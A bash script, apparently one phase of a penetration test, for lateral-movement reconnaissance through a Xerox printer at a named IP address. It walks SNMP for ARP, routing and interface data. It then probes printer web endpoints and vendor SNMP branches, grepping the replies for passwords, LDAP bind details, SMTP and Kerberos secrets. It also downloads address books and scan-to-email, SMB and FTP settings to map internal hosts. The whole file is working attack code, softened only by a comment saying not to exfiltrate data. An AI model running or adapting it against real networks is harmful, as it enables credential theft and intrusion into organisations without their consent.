#!/bin/bash
# Phase 8: Network Pivoting & Lateral Movement Recon
# Scope: "Use printer as a launching pad to get into other parts of the network"
# NOTE: Demonstrate capability, do NOT actually exfiltrate data

TARGET="13.13.1.112"
OUTDIR="../results/08_lateral"
mkdir -p "$OUTDIR"

echo "[*] Phase 8: Lateral Movement Recon - $TARGET"

###############################################################################
# 8a. Network topology discovery via the printer
###############################################################################
echo "[+] Extracting network topology from printer..."

COMM="public"
[[ -f "../results/03_snmp/valid_communities.txt" ]] && COMM=$(head -1 "../results/03_snmp/valid_communities.txt")

# ARP table reveals other hosts the printer has talked to
echo "  -> ARP table:"
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.4.22.1.3 2>/dev/null | tee "$OUTDIR/arp_neighbors.txt"

# Routing table reveals network segments
echo "  -> Routing table:"
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.4.21.1 2>/dev/null | tee "$OUTDIR/routes.txt"

# DNS configuration (reveals internal DNS servers)
echo "  -> DNS configuration:"
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.4.20 2>/dev/null | tee "$OUTDIR/dns_config.txt"

# Interface details (VLANs, multiple interfaces)
echo "  -> Interface details:"
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.2.2.1 2>/dev/null | tee "$OUTDIR/interfaces_detail.txt"

###############################################################################
# 8b. Credential harvesting from printer config
###############################################################################
echo "[+] Checking for stored credentials in accessible endpoints..."

# LDAP configuration (may contain bind DN and password)
for EP in "/ldap/" "/connectivity/" "/network/protocols.dhtml" "/api/v1/config"; do
  RESP=$(curl -skL --connect-timeout 5 "https://$TARGET$EP" 2>/dev/null)
  if echo "$RESP" | grep -iqP '(password|passwd|credential|secret|ldap|bind|smtp|kerberos)'; then
    echo "  [!] Potential credentials at: https://$TARGET$EP"
    echo "$RESP" | grep -iP '(password|passwd|credential|secret|ldap|bind|smtp|kerberos)' \
      > "$OUTDIR/creds_$(echo $EP | tr '/' '_').txt"
  fi
done

# SNMP may store LDAP/SMTP/Kerberos config
echo "[+] Checking SNMP for stored service credentials..."
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.4.1.253 2>/dev/null \
  | grep -iP '(password|secret|key|token|ldap|smtp|mail|auth)' \
  | tee "$OUTDIR/snmp_creds.txt"

###############################################################################
# 8c. Address book / scan destination extraction
###############################################################################
echo "[+] Extracting address book and scan destinations..."

# Xerox printers store email addresses, SMB paths, FTP destinations
ADDRESSBOOK_PATHS=(
  "/webservices/office/emailservice"
  "/addressbook/"
  "/contacts/"
  "/scanprofiles/"
  "/scan/"
  "/dss/"
)

for AB in "${ADDRESSBOOK_PATHS[@]}"; do
  curl -skL --connect-timeout 5 "https://$TARGET$AB" \
    -o "$OUTDIR/addressbook_$(echo $AB | tr '/' '_').html" 2>/dev/null
done

###############################################################################
# 8d. Scan-to-email/SMB/FTP config (reveals internal infrastructure)
###############################################################################
echo "[+] Checking scan destination configurations..."

# These reveal internal mail servers, file servers, AD domains
for CFG in "/email/" "/smb/" "/ftp/" "/connectors/" "/cloudconnector/"; do
  RESP=$(curl -skL --connect-timeout 5 "https://$TARGET$CFG" 2>/dev/null)
  if [[ -n "$RESP" ]] && ! echo "$RESP" | grep -q "404"; then
    echo "$RESP" > "$OUTDIR/scan_config_$(echo $CFG | tr '/' '_').html"
    # Extract hostnames, IPs, domains
    echo "$RESP" | grep -ioP '(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[\w.-]+\.(local|internal|corp|lan|domain))' \
      | sort -u | tee -a "$OUTDIR/internal_hosts.txt"
  fi
done

echo "[*] Lateral movement recon complete. Review results in $OUTDIR/"
